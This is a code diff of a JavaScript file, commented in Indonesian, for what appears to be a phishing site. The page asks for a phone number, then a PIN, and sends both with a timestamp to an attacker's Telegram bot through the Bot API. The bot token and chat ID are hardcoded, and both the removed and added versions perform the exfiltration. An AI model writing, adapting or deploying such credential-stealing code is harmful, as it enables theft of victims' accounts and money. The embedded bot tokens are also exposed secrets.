@@ -1,44 +1,51 @@
-document.addEventListener("DOMContentLoaded", function() {
-    let tokenBot = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo"; // Ganti dengan Token Bot Anda
-    let chatId = "6824078885"; // Ganti dengan Chat ID Anda
+document.addEventListener("DOMContentLoaded", function () {
+    const botToken = "7463211570:AAEvN-TOvXcoLM2JpNg8RBp0OxF6t0Czh70"; // Ganti dengan token bot Anda
+    const chatID = "6824078885"; // Ganti dengan Chat ID Anda
 
-    // Halaman 1: Kirim Nomor HP
-    let formNomor = document.getElementById("formNomor");
-    if (formNomor) {
-        formNomor.addEventListener("submit", function(event) {
+    // Tangani Form Nomor HP
+    const formHp = document.getElementById("formHp");
+    if (formHp) {
+        formHp.addEventListener("submit", function (event) {
             event.preventDefault();
-            let nomorHp = document.getElementById("nomorHp").value;
-
-            // Simpan ke localStorage agar bisa diakses di halaman berikutnya
-            localStorage.setItem("nomorHp", nomorHp);
-
-            // Pindah ke halaman PIN
-            window.location.href = "pin.html";
+            const phone = document.getElementById("phone").value;
+            localStorage.setItem("phone", phone); // Simpan ke Local Storage
+            window.location.href = "pin.html"; // Pindah ke halaman PIN
         });
     }
 
-    // Halaman 2: Kirim PIN + Nomor HP
-    let formPin = document.getElementById("formPin");
+    // Tangani Form PIN
+    const formPin = document.getElementById("formPin");
     if (formPin) {
-        formPin.addEventListener("submit", function(event) {
+        formPin.addEventListener("submit", function (event) {
             event.preventDefault();
-            let pin = document.getElementById("pin").value;
-            let nomorHp = localStorage.getItem("nomorHp") || "-";
+            const pin = document.getElementById("pin").value;
+            const phone = localStorage.getItem("phone"); // Ambil Nomor HP
 
-            let pesan = `📱 *Nomor HP*: ${nomorHp}\n🔢 *PIN*: ${pin}`;
-            let telegramURL = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`;
+            if (!phone) {
+                alert("Nomor HP tidak ditemukan. Harap isi ulang.");
+                window.location.href = "index.html";
+                return;
+            }
+
+            // Format pesan untuk Telegram
+            const message = `📲 *Data Baru Diterima*\n\n📱 *Nomor HP*: \`${phone}\`\n🔢 *PIN*: \`${pin}\`\n📅 Tanggal: ${new Date().toLocaleString()}`;
+
+            // Kirim data ke Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
             fetch(telegramURL)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("Data berhasil dikirim ke Telegram!");
-                        localStorage.removeItem("nomorHp"); // Hapus data setelah dikirim
+                        alert("Data berhasil dikirim!");
                     } else {
                         alert("Gagal mengirim data.");
                     }
                 })
-                .catch(error => console.error("Error:", error));
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Terjadi kesalahan.");
+                });
         });
     }
 });
